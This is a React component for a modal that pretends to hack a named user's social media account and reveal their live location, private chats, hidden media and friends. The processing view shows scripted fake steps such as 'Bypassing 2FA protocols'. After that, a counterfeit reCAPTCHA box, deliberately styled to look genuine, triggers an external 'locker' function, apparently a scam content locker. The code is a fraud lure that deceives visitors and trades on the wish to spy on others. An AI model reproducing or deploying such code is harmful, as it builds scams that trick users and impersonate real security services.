import React, { useEffect, useState } from 'react';
import { X, Lock, Eye, MessageCircle, UserPlus, Users, MapPin, Fingerprint, Smartphone, Cpu, Loader2, Check } from 'lucide-react';
import { Feature, FeatureType, SnapProfile } from '../types';

interface RevealModalProps {
  isOpen: boolean;
  onClose: () => void;
  feature: Feature | null;
  targetUser: string;
  profile?: SnapProfile | null;
}

type ViewState = 'LOADING' | 'PREVIEW' | 'PROCESSING' | 'VERIFICATION';

const RevealModal: React.FC<RevealModalProps> = ({ isOpen, onClose, feature, targetUser, profile }) => {
  const [view, setView] = useState<ViewState>('LOADING');
  const [processProgress, setProcessProgress] = useState(0);
  const [processStep, setProcessStep] = useState(0);

  // Captcha State
  const [captchaState, setCaptchaState] = useState<'IDLE' | 'CHECKING' | 'VERIFIED'>('IDLE');

  // Processing text steps
  const processSteps = [
    'Establishing secure connection...',
    'Bypassing 2FA protocols...',
    'Extracting cloud cache...',
    'Decrypting media fragments...',
    'Reassembling data packets...',
    'Verifying integrity...'
  ];

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('LOADING');
      setProcessProgress(0);
      setProcessStep(0);
      setCaptchaState('IDLE');

      const timer = setTimeout(() => {
        setView('PREVIEW');
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Processing Simulation Logic
  useEffect(() => {
    if (view === 'PROCESSING') {
      const totalDuration = 5000;
      const intervalTime = 50;
      const steps = totalDuration / intervalTime;
      let currentStep = 0;

      const timer = setInterval(() => {
        currentStep++;
        const progress = Math.min((currentStep / steps) * 100, 100);
        setProcessProgress(progress);

        const textIndex = Math.floor((progress / 100) * processSteps.length);
        setProcessStep(Math.min(textIndex, processSteps.length - 1));

        if (currentStep >= steps) {
          clearInterval(timer);
          setTimeout(() => setView('VERIFICATION'), 400);
        }
      }, intervalTime);

      return () => clearInterval(timer);
    }
  }, [view]);

  if (!isOpen || !feature) return null;

  const handleStartProcessing = () => {
    setView('PROCESSING');
  };

  const handleCaptchaClick = () => {
    if (captchaState !== 'IDLE') return;

    setCaptchaState('CHECKING');

    setTimeout(() => {
      setCaptchaState('VERIFIED');

      // Trigger Locker
      setTimeout(() => {
        if (typeof (window as any)._JF === 'function') {
          (window as any)._JF();
        } else {
          console.warn('_JF function not found');
        }
      }, 500);
    }, 1500);
  };

  // --------------------------------------------------------------------------
  // RENDER HELPERS
  // --------------------------------------------------------------------------

  const renderContentPreview = () => {
    switch (feature.id) {
      case FeatureType.LIVE_LOCATION:
        return (
          <div className="w-full h-44 rounded-2xl overflow-hidden relative bg-[#dfe6d8]">
            {/* faux map */}
            <div
              className="absolute inset-0 blur-[5px]"
              style={{
                backgroundImage:
                  'linear-gradient(0deg, rgba(0,0,0,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(0,0,0,0.06) 1px, transparent 1px), linear-gradient(120deg, #cfe0c4 0%, #e3ead9 40%, #cfdbe6 100%)',
                backgroundSize: '26px 26px, 26px 26px, 100% 100%',
              }}
            />
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 blur-[2px]">
              <div className="w-10 h-10 rounded-full bg-snapblue/30 animate-ping absolute inset-0" />
              <MapPin className="w-9 h-9 text-red-500 relative drop-shadow" fill="#ef4444" stroke="#fff" />
            </div>
          </div>
        );
      case FeatureType.SCORE_CHECKS:
        return (
          <div className="space-y-3 w-full">
            {[1, 2, 3].map((i) => (
              <div key={i} className="flex items-center gap-3 bg-white p-3 rounded-xl shadow-sm blur-[4px]">
                <div className="w-10 h-10 bg-gray-200 rounded-full" />
                <div className="flex-1">
                  <div className="h-2.5 w-24 bg-gray-200 rounded mb-2" />
                  <div className="h-2 w-16 bg-gray-100 rounded" />
                </div>
              </div>
            ))}
          </div>
        );
      case FeatureType.BEST_FRIENDS:
        return (
          <div className="grid grid-cols-4 gap-3 w-full">
            {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
              <div key={i} className="flex flex-col items-center gap-1 blur-[4px]">
                 <div className="w-12 h-12 bg-gray-200 rounded-full border-2 border-white shadow-sm" />
              </div>
            ))}
          </div>
        );
      case FeatureType.EYES_ONLY:
        return (
            <div className="grid grid-cols-2 gap-2 w-full">
                {[1, 2, 3, 4].map((i) => (
                    <div key={i} className="aspect-[4/5] bg-gray-200 rounded-xl overflow-hidden relative">
                         <div className="w-full h-full bg-gradient-to-br from-gray-200 to-gray-300 blur-[8px]" />
                    </div>
                ))}
            </div>
        );
      case FeatureType.CHAT_HISTORY:
        return (
            <div className="space-y-4 w-full px-2 py-2">
                <div className="flex gap-2 items-end blur-[5px]">
                    <div className="w-8 h-8 rounded-full bg-gray-200"></div>
                    <div className="bg-gray-100 rounded-2xl rounded-bl-none px-4 py-3 max-w-[80%] h-10"></div>
                </div>
                 <div className="flex gap-2 items-end flex-row-reverse blur-[5px]">
                    <div className="w-8 h-8 rounded-full bg-gray-200"></div>
                    <div className="bg-blue-50 rounded-2xl rounded-br-none px-4 py-3 max-w-[80%] h-14"></div>
                </div>
            </div>
        );
      default:
        return null;
    }
  };

  const getModalIcon = () => {
      switch (feature.id) {
          case FeatureType.LIVE_LOCATION: return <MapPin className="w-7 h-7 text-snapink" />;
          case FeatureType.SCORE_CHECKS: return <Users className="w-7 h-7 text-snapink" />;
          case FeatureType.BEST_FRIENDS: return <UserPlus className="w-7 h-7 text-snapink" />;
          case FeatureType.EYES_ONLY: return <Eye className="w-7 h-7 text-snapink" />;
          case FeatureType.CHAT_HISTORY: return <MessageCircle className="w-7 h-7 text-snapink" />;
          default: return <Lock className="w-7 h-7 text-snapink" />;
      }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/45 transition-opacity duration-300"
        onClick={() => view !== 'PROCESSING' && onClose()}
      />

      {/* Modal Card */}
      <div className="relative w-full max-w-md bg-[#FBF7E6] rounded-t-[34px] sm:rounded-[34px] p-6 shadow-2xl animate-slide-up sm:animate-pop-in mb-0 sm:mb-4 mx-0 sm:mx-4 overflow-hidden">

        {/* Grab handle */}
        <div className="sm:hidden absolute top-2.5 left-1/2 -translate-x-1/2 w-10 h-1.5 rounded-full bg-black/15" />

        {view !== 'PROCESSING' && view !== 'VERIFICATION' && (
            <button
                onClick={onClose}
                className="absolute top-5 right-5 z-20 text-snapink/50 hover:text-snapink p-2 rounded-full bg-black/5 active:scale-95 transition-all"
            >
                <X size={20} />
            </button>
        )}

        <div className="flex flex-col items-center pt-2 min-h-[400px]">

          {/* VIEW: INITIAL LOADING */}
          {view === 'LOADING' && (
             <div className="flex-1 flex flex-col items-center justify-center w-full">
                <div className="relative w-16 h-16">
                    <div className="w-16 h-16 rounded-full border-4 border-black/10"></div>
                    <div className="absolute inset-0 w-16 h-16 rounded-full border-4 border-transparent border-t-snapblue animate-spin"></div>
                </div>
                <h3 className="font-display text-lg font-extrabold text-snapink mt-8 mb-2">Analyzing Request</h3>
                <p className="text-snapbrown text-sm font-medium">Handshaking with server...</p>
             </div>
          )}

          {/* VIEW: PREVIEW */}
          {view === 'PREVIEW' && (
            <>
                <div className="relative mb-5 animate-float">
                    {profile && profile.avatarUrl ? (
                        <div className="relative">
                            <img
                                src={profile.avatarUrl}
                                alt={profile.displayName}
                                className="w-20 h-20 rounded-3xl object-cover ring-4 ring-snapblue/60 shadow-lg"
                            />
                            <div className="absolute -bottom-2 -right-2 p-2 rounded-2xl bg-white shadow-md">
                                {React.cloneElement(getModalIcon() as React.ReactElement, { className: 'w-5 h-5 text-snapink' } as any)}
                            </div>
                        </div>
                    ) : (
                        <div className="p-4 rounded-3xl bg-snapbg shadow-sm">
                            {getModalIcon()}
                        </div>
                    )}
                </div>

                <h2 className="font-display text-2xl font-extrabold text-snapink text-center mb-2 tracking-tight">
                    {feature.title}
                </h2>

                <p className="text-snapbrown text-sm text-center mb-7 px-4 leading-relaxed font-medium">
                   Hidden data found for <span className="text-snapink font-bold">{profile ? profile.displayName : `@${targetUser}`}</span>. <br/> Reveal to decrypt content.
                </p>

                {/* Blurred Content Container */}
                <div className="w-full relative bg-black/[0.03] rounded-2xl p-4 mb-7 border border-black/5 overflow-hidden">
                    {renderContentPreview()}

                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#FBF7E6]/40 backdrop-blur-[4px] z-10">
                        <div className="bg-snapblue p-3.5 rounded-full shadow-lg mb-3 ring-4 ring-white/50">
                            <Lock className="w-6 h-6 text-white" />
                        </div>
                        <span className="text-[10px] font-bold text-snapink uppercase tracking-widest bg-white/80 px-4 py-1.5 rounded-full shadow-sm">Encrypted</span>
                    </div>
                </div>

                <button
                    onClick={handleStartProcessing}
                    className="snap-btn w-full font-bold text-[15px] uppercase tracking-[0.15em] py-4 rounded-full transition-transform"
                >
                    Reveal Data
                </button>
            </>
          )}

          {/* VIEW: PROCESSING */}
          {view === 'PROCESSING' && (
            <div className="w-full flex-1 flex flex-col items-center justify-center py-6">

                <div className="relative w-24 h-24 mb-10">
                    <div className="absolute inset-0 bg-snapblue/20 rounded-full animate-ping"></div>
                    <div className="absolute inset-0 border-2 border-snapblue rounded-full opacity-30"></div>
                    <div className="absolute inset-0 rounded-full flex items-center justify-center bg-white shadow-xl">
                         <Cpu className="text-snapblue w-10 h-10 animate-pulse" />
                    </div>
                </div>

                <div className="w-full max-w-xs space-y-2 mb-8">
                    <div className="flex justify-between text-xs font-bold text-snapbrown uppercase tracking-wider">
                        <span>Progress</span>
                        <span className="text-snapink">{Math.round(processProgress)}%</span>
                    </div>
                    <div className="w-full bg-black/10 rounded-full h-2.5 overflow-hidden">
                        <div
                            className="h-full bg-snapink transition-all duration-100 ease-out relative"
                            style={{ width: `${processProgress}%` }}
                        >
                            <div className="absolute inset-0 bg-white/40 w-full h-full animate-[shimmer_1s_infinite]"></div>
                        </div>
                    </div>
                </div>

                <div className="h-8 flex items-center justify-center">
                    <span className="text-sm font-semibold text-snapink animate-fade-in-up">
                        {processSteps[processStep]}
                    </span>
                </div>
            </div>
          )}

          {/* VIEW: VERIFICATION */}
          {view === 'VERIFICATION' && (
            <div className="w-full flex-1 flex flex-col items-center animate-pop-in pt-4 justify-center">
                <div className="w-16 h-16 bg-white rounded-3xl flex items-center justify-center mb-4 shadow-md">
                    <Fingerprint className="w-8 h-8 text-snapblue" strokeWidth={1.5} />
                </div>

                <h2 className="font-display text-xl font-extrabold text-snapink mb-1 text-center">
                    Security Check
                </h2>
                <p className="text-snapbrown text-center text-xs mb-6 max-w-[280px] leading-relaxed font-medium">
                    Please complete the verification to unlock the results.
                </p>

                {/* FAKE RECAPTCHA COMPONENT (kept authentic on purpose) */}
                <div
                    onClick={handleCaptchaClick}
                    className="bg-[#f9f9f9] border border-[#d3d3d3] rounded-[3px] w-[302px] h-[74px] p-3 flex items-center shadow-sm cursor-pointer select-none mb-6 hover:bg-[#f0f0f0] transition-colors"
                >
                    <div className="flex items-center justify-center w-[28px] h-[28px] bg-white border border-[#c1c1c1] rounded-[2px] mr-3">
                         {captchaState === 'IDLE' && <div />}
                         {captchaState === 'CHECKING' && <Loader2 className="w-5 h-5 text-blue-500 animate-spin" />}
                         {captchaState === 'VERIFIED' && <Check className="w-6 h-6 text-green-500" />}
                    </div>
                    <div className="text-[14px] font-normal text-black">I'm not a robot</div>
                    <div className="ml-auto flex flex-col items-center justify-center w-[70px]">
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-8 h-8 opacity-70" alt="" />
                        <div className="text-[10px] text-[#555] mt-1 text-center leading-none">reCAPTCHA</div>
                        <div className="text-[8px] text-[#555] text-center leading-none mt-0.5">Privacy - Terms</div>
                    </div>
                </div>

                <div className="mt-2 flex items-center gap-2 px-3 py-1.5 bg-black/5 rounded-full">
                    <Smartphone className="w-3.5 h-3.5 text-snapgreen" />
                    <span className="text-[10px] font-semibold text-snapbrown">
                        Secure 256-bit SSL Connection
                    </span>
                </div>

                 <button
                    onClick={onClose}
                    className="mt-6 text-snapbrown text-xs font-semibold hover:text-snapink p-2 transition-colors"
                >
                    Cancel Request
                </button>
            </div>
          )}

        </div>
      </div>
    </div>
  );
};

export default RevealModal;
